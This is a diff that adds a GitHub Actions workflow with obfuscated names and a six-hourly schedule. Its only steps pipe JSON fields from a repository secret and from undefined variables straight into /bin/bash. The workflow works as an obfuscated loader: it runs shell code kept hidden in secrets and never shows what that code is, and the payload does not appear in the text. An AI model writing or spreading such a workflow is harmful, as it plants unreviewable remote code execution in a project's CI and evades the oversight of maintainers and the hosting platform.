@@ -1,0 +1,32 @@
+name: yigeshitaa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yigeshitaa
+        env:
+          uqvrj07: ${{ secrets.uqvrj07 }}
+        run: |
+          echo $uqvrj07 | jq -r .gtwis2 | /bin/bash
+          echo $jtow1040 | jq -r .p1 | /bin/bash
+          echo $xr928 | jq -r .ecgt68445 | /bin/bash
+          echo $sl2270 | jq -r .xqypg0 | /bin/bash
+          echo $zbl1166 | jq -r .byz02 | /bin/bash
+          echo $us9 | jq -r .qhp84 | /bin/bash
+          echo $hiiqx0 | jq -r .hh364 | /bin/bash
+          echo $ncqg62224 | jq -r .hd74725 | /bin/bash
+          echo $n1047 | jq -r .taud33174 | /bin/bash
+          echo $qavq410 | jq -r .fiycm5715 | /bin/bash
+          echo $poi78937 | jq -r .xh3596 | /bin/bash
+          echo $nn4 | jq -r .vrhci5 | /bin/bash
+          echo $kc029 | jq -r .yk253 | /bin/bash
+          echo $uub93 | jq -r .ponzc450 | /bin/bash
+          echo $gge394 | jq -r .hvsom30 | /bin/bash
+
